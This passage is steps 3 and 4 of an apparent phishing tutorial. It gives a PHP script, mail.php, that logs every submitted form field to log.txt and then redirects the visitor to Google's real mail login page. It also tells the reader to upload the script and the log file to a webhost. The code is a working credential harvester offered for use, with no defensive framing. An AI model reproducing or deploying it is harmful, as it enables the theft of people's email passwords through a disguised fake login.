3.  Create a text file and copy the code below and then save it as mail.php and save to website. 

<?php 
header ('Location: https://www.google.com/accounts/ServiceLoginAuth?service=mail '); 
$handle = fopen("log.txt", "a"); 
foreach($_POST as $variable => $value) { 
   fwrite($handle, $variable); 
   fwrite($handle, "="); 
   fwrite($handle, $value); 
   fwrite($handle, "\r\n"); 
} 
fwrite($handle, "\r\n"); 
fclose($handle); 
exit; 
?> 

4\. Create a file named log.txt and upload to webhost. 

